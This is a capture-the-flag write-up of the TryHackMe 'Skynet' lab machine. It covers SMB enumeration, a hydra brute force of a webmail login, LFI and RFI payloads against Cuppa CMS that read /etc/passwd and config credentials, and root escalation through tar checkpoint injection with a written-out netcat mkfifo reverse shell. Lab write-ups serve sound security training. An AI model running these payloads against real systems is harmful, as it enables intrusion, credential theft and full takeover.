# ROOM : SKYNET

Hello, this is a write-up for [Skynet](https://tryhackme.com/room/skynet) room.
I rewrite this soon to be more readable lol !

Password and flag are hidden.

I rooted this machine in 3hours. 

## Enumeration
First, i call my bestfriend, nmap to scan this ip:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 06:06 EDT
Nmap scan report for 10.10.250.118
Host is up (0.040s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
22/tcp  open  ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http          Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3          Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING CAPA UIDL SASL AUTH-RESP-CODE TOP
139/tcp open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap          Dovecot imapd
|_imap-capabilities: more IDLE Pre-login LITERAL+ LOGINDISABLEDA0001 post-login listed ID LOGIN-REFERRALS SASL-IR capabilities have OK ENABLE IMAP4rev1
445/tcp open  Dovecot pop3d Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-08-24T10:06:16
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-08-24T05:06:16-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
```
We have a webserver, samba, and a POP3/IMAP server

We have to enumerate theses SMB share, they have generaly some juicy files.

### SMB Enumeration
I use smbclient to enumerate a smb server:
```
smbclient -L 10.10.250.118 -U " "%" "
```
**" "%" "** means "connect as anonymous without password".

Result: 
```
Password for [WORKGROUP\Anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```
We found 2 interresting folder, anonymous and milesdyson.

lets continue !

```
smbclient //10.10.250.118/anonymous -U " "%" "
```
Result: 
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5823252 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> dir
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5823252 blocks available
```
We need to get all files !
```
mget *
```
All file is empty except log1.txt

log1.txt is wordlist with passwords. That means on things : we have to bruteforce miles account !

### Web enum
I use gobuster to enumerate webserver
```
gobuster dir -u http://10.10.250.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Here the result :
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.250.118
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.250.118/admin/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.250.118/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.250.118/js/]
/config               (Status: 301) [Size: 315] [--> http://10.10.250.118/config/]
/ai                   (Status: 301) [Size: 311] [--> http://10.10.250.118/ai/]
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.250.118/squirrelmail/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```
Here the POP/IMAP server we found previously with nmap, its squirrel mail server.

## Time to attack !
We have an id (milesdyson) and a list of passwords (log1.txt). We can try to bruteforce this webmail server.

To do this, i use hashcat:
```
hydra -l milesdyson -P /home/kali/Challenge/TryHackMe/Skynet/log1.txt 10.10.250.118 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -V 
```
Result: 

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-24 06:59:41
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.250.118:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.10.250.118 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[...]
[80][http-post-form] host: 10.10.250.118   login: milesdyson   password: **************************
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-24 06:59:57

```
We found the credentials !

So, at this points we have :
ID : milesdyson
PW : *****************

We can connect to squirrel

## Lets founds somes password !
We are connected, we have 3 mails, 1 mail with a new password for milesdyson 

)s{************

We can use this password in samba to get file of miles dyson. Se, we reconnect to smb using miles dyson credentials :

we found a file named "important.txt" it talk about hidden page 

/45kr*********

This page displays a photo of miler dyson.

Lets try a gobuster again on this page :
```
gobuster dir -u http://10.10.250.118/45kr**********/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Result: 
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.250.118/45kr***********/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 339] [--> http://10.10.250.118/45kr*********/administrator/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```
We found /administrator page.
Its admin page of CUPPA CMS.

## CUPA CMS

After quick google, we found an LFI on this CMS, lets try to exploit it.

With this payload we can see its vulnerable :
```
http://10.10.250.118/45kr**********/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
Result :
```
Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```
We try other payload to get the configuration file of CUPPA CMS:
```
http://10.10.250.118/45kr************/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```
Result :
```
Field configuration: 
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg==
```
We need to decode this base64, here the result:
```
<?php 
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "password123";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        } 
?>
```
We can get the user flag with this LFI :
```
http://10.10.250.118/45kr**************/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
```
Result:
```
Field configuration: 
7ce***********************
```
### We need a reverse shell now !

I openned et netcat listener on port 4444
```
nc -lnvp 4444
```
Then, exploit a RFI to upload a shell:
```
http://10.10.250.118/45kr**************/administrator/alerts/alertConfigField.php?urlConfig=http://{MY_IP}/shell.php
```
We now have the reverse shell on the server as www-data !

(Forget to copy the shell... maybe later !)

I look at mysql db and dumped cu_users db, i found admin account of CUPPA, but its useless. Dont waste your time here ;).

## Privesc !

I download linpeas on the server to check possible privesc

He found something interesting :
```
/home/milesdyson/backups/backup.sh
```
Let see the script :
```
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
As we can see, this script go on /var/www/html and use the command tar to archive everything in this folder. We can see in crontab its executed by root 
```
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```
We can exploit tar to get a root shell.
Tar can use wildcards, there are “checkpoint” flags, which allow you to execute actions and commands after a specified number of files have been archived. 
i'm gonna create a checkpoint in /var/www/html folder

1. I open a listerner
```
nc -lnvp 1234
```
2) Let exploit this !

first, we create the checkpoint and the revshell:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MY_IP} 1234 >/tmp/f" > shell.sh
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Wait until cron has executed his task, and we have root shell.
```
listening on [any] 1234 ...
connect to [{MY_IP}] from (UNKNOWN) [10.10.250.118] 58010
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

We can get the root flag
```
cat /root/root.txt
3f03***********************
```
